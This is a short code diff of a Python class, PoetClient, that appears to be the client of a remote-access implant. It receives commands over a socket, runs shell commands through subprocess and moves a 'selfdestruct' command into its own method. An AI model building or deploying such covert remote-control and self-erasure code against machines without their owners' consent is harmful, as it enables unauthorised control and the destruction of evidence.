@@ -65,13 +65,6 @@ class PoetClient(object):
                 if inp == 'fin':
                     found = True
                     break
-                elif inp == 'selfdestruct':
-                    try:
-                        selfdestruct()
-                        self.s.send('boom')
-                        sys.exit()
-                    except Exception as e:
-                        self.s.send(str(e.message))
                 elif inp.startswith('chint'):
                     found = True
                     self.chint(self.s, inp)
@@ -199,6 +192,14 @@ class PoetClient(object):
                 s.send(msg)
             except Exception as e:
                 s.send(str(e.message))
+
+    def selfdestruct(self):
+        """Trampoline to execute real, global selfdestruct function. It's
+        global because it can be called in main. This exists so selfdestruct
+        can be implemented as a module.
+        """
+
+        selfdestruct()
 
     def cmd_exec(self, cmd):
         """Light wrapper over subprocess.Popen()."""
